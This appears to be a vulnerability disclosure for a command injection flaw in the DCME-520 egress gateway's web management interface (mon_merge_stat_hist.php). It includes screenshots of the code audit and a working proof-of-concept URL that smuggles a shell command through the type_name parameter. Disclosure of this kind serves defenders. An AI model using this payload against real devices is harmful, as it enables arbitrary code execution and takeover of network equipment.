## Affected version 

DCME-520

## Vulnerability details 

DCME-520 Multi-core egress gateway is a new generation of high-performance Internet egress gateway for multi-user, multi-traffic and multi-service types. The command execution vulnerability exists in the DCME-520 gateway web management background. Attackers can use this series of vulnerabilities to execute arbitrary code on the device and control the device.

The firmware download address: https://www.dcnetworks.com.cn/ruanjian.html?title=dcme
The test environment is a real dcme-520 



一、mon_merge_stat_hist.php

Code audit
Code position in equipment system in/usr/local/WWW/function/audit/newstatistics/mon_merge_stat_hist. PHP
First, the user can control the following parameters, among which statset is used to control the conditional branch

![image-20250320232816219](https://github.com/user-attachments/assets/5c6cc97d-5e82-4272-8518-1fd21be550b2)

2、There are injection points inside the getList function, and these parameters can be controlled by the user

![image-20250320232845393](https://github.com/user-attachments/assets/814d168f-ac34-4b5a-9ad5-e6239619c388)

3、payload:? statset=predef_bw_user&type=5mins&type_name=|echo 114514 > 1.txt|

verify
Log in to the web management background

![image-20250320232920424](https://github.com/user-attachments/assets/9cb3f5dc-98ff-426d-b32e-65848dd8db1a)

Access the url of the vulnerability:
http://8363-218-19-14-194.ngrok-free.app/function/audit/newstatistics/mon_merge_stat_hist.php

![image-20250320232949766](https://github.com/user-attachments/assets/06b378d4-15c1-4825-bd16-11635d2fce90)

Construction payload:
Create the txt file and write the numbers

```http
poc：
https://8363-218-19-14-194.ngrok-free.app/function/audit/newstatistics/mon_merge_stat_hist.php?statset=predef_bw_user&type=5mins&type_name=|echo%20114514%20%3E%201.txt|
```

Send poc execution

![image-20250320233044749](https://github.com/user-attachments/assets/ff05708f-e857-4b6f-b4e4-a65aaad588d8)

txt file is created and written successfully

![image-20250320233108312](https://github.com/user-attachments/assets/2b8805d1-4f8e-4da0-8cff-c6a2d08e907c)







